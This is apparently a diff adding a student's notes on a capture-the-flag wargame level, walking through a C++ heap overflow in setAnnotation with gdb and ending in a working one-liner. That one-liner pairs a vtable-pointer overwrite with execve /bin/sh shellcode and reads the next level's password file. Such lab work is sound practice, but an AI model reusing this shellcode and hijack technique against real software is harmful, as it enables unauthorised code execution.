@@ -1,0 +1,137 @@
+## Interessant EBP
+Ancien EBP ←  %ebp = %esp
+Adresse de retour
+Argument 1
+Argument 2
+Argument 3
+
+argc => rbp - 4
+argv => rbp - 16
+Reverse engeneering:
+V-table => list of functions
+
+0x08048737 <+163>:	call   *%edx => is actually the call to the operator+
+
+This function uses memcpy to write the bytes starting at the memory location pointed to by “str”, the function’s argument, to the memory locations starting at “annotation”.
+It also uses the length of the string “a” as the number of bytes to write.
+While it’s good that strlen is used to provide a number of bytes to copy, it should have been limited by the length of “annotation”, not simply “str”.
+Since we can control a’s value, and subsequently it’s length, we can overflow the annotation buffer, and cause changes to the heap.
+
+
+(gdb) r $(python -c 'print "A"*500')
+Starting program: /home/user/level9/level9 $(python -c 'print "A"*500')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) i r
+eax            0x41414141	1094795585
+ecx            0x41414141	1094795585
+edx            0x804a200	134521344
+ebx            0x804a078	134520952
+esp            0xbffff4d0	0xbffff4d0
+ebp            0xbffff4f8	0xbffff4f8
+esi            0x0	0
+edi            0x0	0
+eip            0x8048682	0x8048682 <main+142>
+eflags         0x210287	[ CF PF SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb)
+So it crashes but we do not get to overwrite EIP .. but EAX looks interesting ( 0x41366441 = AAAA ). Lets see how many bytes we have:
+offset 108
+
+This link is more ineteresting: https://www.greyhat.dk/io-smashthestack-level-08/
+
+
+After analysing the asm code:
+we can assume our stack frame looks like:
+0x1c   0x18 0x14 0x10 0xc   0x8
+[&six][&five][*y][*x][argv][argc][sfp][ra]
+
+So let’s throw a break at 0x08048677 main<+131>:call  0x804870e <_ZN1N13setAnnotationEPc>: –Call to Number::setAnnotation(char*) And check out the stack.
+
+Breakpoint 1, 0x080048677 in main ()
+(gdb) x/32xb $esp
+0xbffff6c0:	0x08	0xa0	0x04	0x08	0xcd	0xf8	0xff	0xbf
+0xbffff6c8:	0x90	0xf7	0xff	0xbf	0x55	0x9e	0xd7	0xb7
+0xbffff6d0:	0x78	0xa0	0x04	0x08	0x08	0xa0	0x04	0x08
+0xbffff6d8:	0x78	0xa0	0x04	0x08	0x08	0xa0	0x04	0x08
+
+Looking at main’s assembly we can see that at this point in execution, esp+4 holds the address of the start of argv[1].
+Also, esp holds the address that we’re going to write to (aka the address of the annotation array of the structure refered to by the variable five).
+The structure of this address shows us that it isn’t in the same place in memory as all the 0xbfff—- addresses.
+This 0x0804—- area, it turns out, is the heap.
+The heap is similar to the stack and is used when a program needs to dynamically allocate more memory.
+In our program today, that happened when the “new” command was used to create two instances of the Number class, and is why they reside in the heap.
+
+Examining the stack some more, we can find the values stored in both reference variables five and six.
+They are located at +0x18 and +0x1c on the stack respectively from $esp.  Thus, we can see our Number instances are located at 0x0804a008 and 0x0804a078.  It is important to remember that with the heap, memory addresses grow up, unlike with the stack, which is why “six” is at a larger memory address than “five”.
+
+Next, let’s go a head and look at the memory that represents one of our instances.  Let’s check out instance “six”:
+(gdb) x/108xb 0x0804a07
+0x804a078:	0x48	0x88	0x04	0x08	0x00	0x00	0x00	0x00
+0x804a080:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a0b8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a0c0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a0c8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a0d0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a0d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x804a0e0:	0x06	0x00	0x00	0x00
+
+Let’s start from the bottom and notice that the int value “number” is stored at the end (notice the int value 6).
+Next we see the memory which is allocated for the 100 byte character array.
+Finally, at the very top of the structure, we see 4 bytes which look an awful lot like a memory address. The reason is because it is!
+Let’s look at the address and see if we can tell what it is:
+(gdb) disass 0x08048848
+Dump of assembler code for function _ZTV1N:
+   0x08048840 <+0>:	add    %al,(%eax)
+   0x08048842 <+2>:	add    %al,(%eax)
+   0x08048844 <+4>:	push   %esp
+   0x08048845 <+5>:	mov    %al,(%eax,%ecx,1)
+   0x08048848 <+8>:	cmp    -0x78b1f7fc(%edi),%al
+   0x0804884e <+14>:	add    $0x8,%al
+End of assembler dump.
+Looking at when it’s called in main, we can decern that it is the virtual table for the virtual functions of the number class.
+Also, looking back at the assembly of main, we can see that the virtual table accessed is that of the “six” structure.
+Since the buffer we can overflow is that of “five”, if we overflow the bytes in the “six” structure which point to the virtual table with the address of a function we want to execute, we should be able to hijack execution.
+(Almost.  Since the v-table has another level of links we’ll have to add another level of de-referencing)
+So, counting up the memory locations, we can see that there are 108 bytes between the start of “annotation” in “five” and the start of the six structure, where the v-table pointer is.
+Thus, we’ll need to overflow the annotation buffer with 108 bytes, then 4 more bytes to overwrite the function pointer of “six”.
+To make sure this is correct, let’s test it in gdb and drop a breakpoint to check the values again:
+(gdb) run `python -c "print 'A'*108 + 'BBBB'"`
+(gdb) i r
+eax            0x804a078	134520952
+ecx            0x42424242	1111638594
+edx            0x804a07c	134520956
+ebx            0x804a078	134520952
+esp            0xbffff650	0xbffff650
+ebp            0xbffff678	0xbffff678
+esi            0x0	0
+edi            0x0	0
+eip            0x8048680	0x8048680 <main+140>
+eflags         0x200287	[ CF PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/8xb 0x0804a078
+0x804a078:	0x42	0x42	0x42	0x42	0x00	0x00	0x00	0x00
+Now we just need to overwrite this pointer with a valid memory location, perhaps that of some shellcode.
+Since we know the address of the annotation buffer in five, let’s try hosting our shellcode there.
+
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"A"*51 + "\x0c\xa0\x04\x08"')
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
